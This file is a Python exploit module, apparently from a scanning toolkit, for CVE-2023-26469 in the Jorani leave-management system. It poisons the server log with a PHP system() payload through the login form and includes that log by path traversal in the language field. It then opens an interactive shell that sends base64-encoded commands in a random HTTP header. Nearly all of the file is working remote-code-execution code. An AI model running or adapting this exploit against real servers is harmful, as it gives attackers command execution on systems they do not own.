"""
vulnerability covered by CVE-2023-26469
"""
import requests
import datetime
import re
import base64
import random
import string
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

class CVE_Jorani_RCE_Scan:
	def main(self,target):
		msg = lambda x,y="\n":print(f'\x1b[92m[+]\x1b[0m {x}', end=y)
		err = lambda x,y="\n":print(f'\x1b[91m[x]\x1b[0m {x}', end=y)
		log = lambda x,y="\n":print(f'\x1b[93m[?]\x1b[0m {x}', end=y)

		CSRF_PATTERN = re.compile('<input type="hidden" name="csrf_test_jorani" value="(.*?)"')
		CMD_PATTERN = re.compile('---------(.*?)---------', re.S)

		URLS = {
			'login' : '/session/login',
			'view'	: '/pages/view/',
		}

		alphabet = string.ascii_uppercase
		HEADER_NAME = ''.join(random.choice(alphabet) for i in range(12))

		BypassRedirect = {
			'X-REQUESTED-WITH'	: 'XMLHttpRequest',
			HEADER_NAME		: ""
		}

		INPUT = "\x1b[92mjrjgjk\x1b[0m@\x1b[41mjorani\x1b[0m(PSEUDO-TERM)\n$ " # The input used for the pseudo term

		u = lambda x,y: x + URLS[y]

		POISON_PAYLOAD		= "<?php if(isset($_SERVER['HTTP_" + HEADER_NAME + "'])){system(base64_decode($_SERVER['HTTP_" + HEADER_NAME + "']));} ?>"
		PATH_TRAV_PAYLOAD	= "../../application/logs"

		print("""
		/!\\ Do not use this if you are not authorized to /!\\
			""")
		log("POC made by @jrjgjk (Guilhem RIOUX)", "\n\n")


		log(f"Header used for exploit: {HEADER_NAME}")


		t = target["url"].strip("/ ")
		ssl = target["ssl"]
		header = target["header"]

		proxy = target["proxy"]

		self.header,self.proxy = ReqSet(header=header, proxy=proxy)

		OutPrintInfo("Jorani","开始检测Jorani休假管理系统远程命令执行...")
		s = requests.Session()
		log("Requesting session cookie")
		res = s.get(u(t,"login"), verify = ssl,headers=self.header,proxies=self.proxy)

		C = s.cookies.get_dict()

		Date = datetime.date.today()
		log_file_name = f"log-{Date.year}-{str(Date.month).zfill(2)}-{str(Date.day).zfill(2)}"

		csrf_token = re.findall(CSRF_PATTERN, res.text)[0]
		log(f"Poisonning log file with payload: '{POISON_PAYLOAD}'")
		log(f"Set path traversal to '{PATH_TRAV_PAYLOAD}'")
		msg(f"Recoveredd CSRF Token: {csrf_token}")

		data = {
			"csrf_test_jorani"	: csrf_token,
			"last_page"			: "session/login",
			"language"			: PATH_TRAV_PAYLOAD,
			"login"				: POISON_PAYLOAD,
			"CipheredValue"		: "DummyPassword"
		}

		s.post(u(t,"login"), data=data)

		log(f"Accessing log file: {log_file_name}")

		exp_page = t + URLS['view'] + log_file_name

		### Shell
		cmd = ""
		while True:
			cmd = input(INPUT)
			if(cmd in ['x', 'exit', 'quit']):
				break
			elif(cmd == ""):
				continue
			else:
				BypassRedirect[HEADER_NAME] = base64.b64encode(b"echo ---------;" + cmd.encode() + b" 2>&1;echo ---------;")
				res = s.get(exp_page, headers=BypassRedirect,verify = ssl,proxies=self.proxy)
				cmdRes = re.findall(CMD_PATTERN, res.text)
				try:
					print(cmdRes[0])
				except:
					print(res.text)
					err("Wow, there was a problem, are you sure of the URL ??")
					err('exiting..')
					break
		OutPrintInfo("Jorani", "Jorani休假管理系统远程命令执行检测结束")

